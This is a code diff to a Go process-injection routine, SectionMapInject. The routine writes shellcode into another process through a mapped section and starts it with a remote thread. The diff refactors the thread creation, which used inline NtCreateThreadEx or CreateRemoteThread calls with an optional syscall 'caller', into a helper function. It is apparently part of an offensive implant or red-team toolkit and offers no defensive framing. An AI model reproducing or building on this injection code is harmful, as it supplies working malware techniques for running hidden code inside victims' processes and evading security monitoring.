@@ -83,35 +83,12 @@ func SectionMapInject(pid int, shellcode []byte, caller *wsyscall.Caller) error 
 	ntUnmapView(caller, currentProcess, localBase)
 
 	// 6. Create a remote thread at the mapped address.
-	var hThread uintptr
-	if caller != nil {
-		r, _ := caller.Call("NtCreateThreadEx",
-			uintptr(unsafe.Pointer(&hThread)),
-			api.ThreadAllAccess,
-			0,
-			uintptr(hProcess),
-			remoteBase,
-			0,
-			0, 0, 0, 0, 0,
-		)
-		if r != 0 {
-			ntUnmapView(caller, uintptr(hProcess), remoteBase)
-			return fmt.Errorf("remote thread creation failed: NTSTATUS 0x%X", r)
-		}
-	} else {
-		ret, _, callErr := api.ProcCreateRemoteThread.Call(
-			uintptr(hProcess),
-			0, 0,
-			remoteBase,
-			0, 0, 0,
-		)
-		if ret == 0 {
-			ntUnmapView(caller, uintptr(hProcess), remoteBase)
-			return fmt.Errorf("remote thread creation failed: %w", callErr)
-		}
-		hThread = ret
+	hThread, err := CreateRemoteThreadWithCaller(hProcess, remoteBase, 0, caller)
+	if err != nil {
+		ntUnmapView(caller, uintptr(hProcess), remoteBase)
+		return fmt.Errorf("remote thread creation failed: %w", err)
 	}
-	windows.CloseHandle(windows.Handle(hThread))
+	windows.CloseHandle(hThread)
 
 	return nil
 }
